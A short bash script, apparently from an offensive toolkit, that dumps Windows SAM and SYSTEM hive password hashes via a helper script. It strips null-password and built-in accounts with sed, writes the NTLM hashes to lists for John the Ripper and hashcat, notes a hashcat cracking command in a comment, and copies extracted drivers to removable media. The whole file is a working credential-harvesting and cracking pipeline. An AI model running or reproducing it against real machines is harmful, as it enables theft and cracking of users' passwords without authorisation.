#!/bin/bash
# harvest all SAM & SYSTEM hives scrape out all worthless accounts using sed
# pipe to tee so john the ripper can use for cracking
# pipe that to cut grab just the NTLM hashes from the list and tee those out to hashcat for cracking
# aad3b435b51404eeaad3b435b51404ee is a NULL PASSWORD HASH so we just ignore these since it will tie up unessisary resources
./harvest.py | sed "s:*aad3b435b51404eeaad3b435b51404ee*::g" | sed "s:ASPNET.*::g" | sed "s:SUPPORT.*::g" | sed "s:HelpAssistant.*::g" | sed "s:HomeGroupUser.*::g" | sed "s:ERR\: ::g" | sed "s:Couldn't find.*::g" | sort -u | tee john.lst | cut -f 1,4 -d ":" | tee hashcat.lst
echo " "
echo " "
echo "Passwords have been dumped to hashcat.lst and john.lst for cracking"
#echo "hashcat --username --status -m 1000 -a 0 -o cracked.txt --remove /media/hashcat.lst /usr/share/sqlmap/txt/wordlist.txt"
echo " "
echo " "
echo "Running Driver Extraction procedures......"
./driver_extractor.py | tee | xargs -i cp -R {} /media/drivers
